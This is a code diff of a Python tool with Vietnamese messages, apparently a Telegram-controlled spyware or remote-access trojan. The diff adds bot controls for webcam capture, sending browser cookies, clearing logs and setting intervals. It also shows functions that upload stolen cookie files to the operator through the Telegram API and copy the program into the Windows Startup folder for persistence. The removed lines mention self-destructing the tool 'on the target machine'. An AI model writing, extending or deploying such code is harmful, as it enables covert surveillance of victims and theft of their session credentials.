@@ -318,7 +318,10 @@ def send_telegram_document(path):
 def get_control_keyboard():
     return {
         "keyboard": [
-            [{"text": "/status"}, {"text": "/help"}]
+            [{"text": "/status"}, {"text": "/webcam"}],
+            [{"text": "/browser"}, {"text": "/clear"}],
+            [{"text": "/interval"}, {"text": "/name"}],
+            [{"text": "/help"}]
         ],
         "resize_keyboard": True,
         "one_time_keyboard": False
@@ -328,13 +331,7 @@ def setup_bot_commands():
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/setMyCommands"
         commands = [
-            {"command": "status", "description": "Xem trạng thái hoạt động"},
-            {"command": "webcam", "description": "Chụp hình từ webcam"},
-            {"command": "browser", "description": "Gửi cookie trình duyệt"},
-            {"command": "clear", "description": "Xóa logs và ảnh tạm thời"},
-            {"command": "interval", "description": "Cấu hình thời gian gửi/chụp"},
-            {"command": "name", "description": "Xem/Cài đặt tên máy"},
-            {"command": "destruct", "description": "Tự hủy tool trên máy mục tiêu"},
+            {"command": "status", "description": "Xem trạng thái và Bảng điều khiển các máy"},
             {"command": "help", "description": "Hướng dẫn sử dụng chi tiết"}
         ]
         requests.post(url, json={"commands": commands}, timeout=10)
@@ -702,7 +699,6 @@ def get_browser_data():
         for name in browsers:
             filename = f"cookies_{name.lower()}.txt"
             if os.path.exists(filename):
-                send_telegram_message(f"📁 Cookies {name}")
                 send_telegram_document(filename)
         return True
     except Exception as e:
@@ -973,7 +969,6 @@ def add_to_startup(force=False):
                 try: os.remove(target_path)
                 except: pass
             shutil.copy2(current_exe, target_path)
-            print("✅ Đã copy vào Startup")
         return True
     except Exception as e:
         print(f"⚠️ Lỗi Startup: {e}")
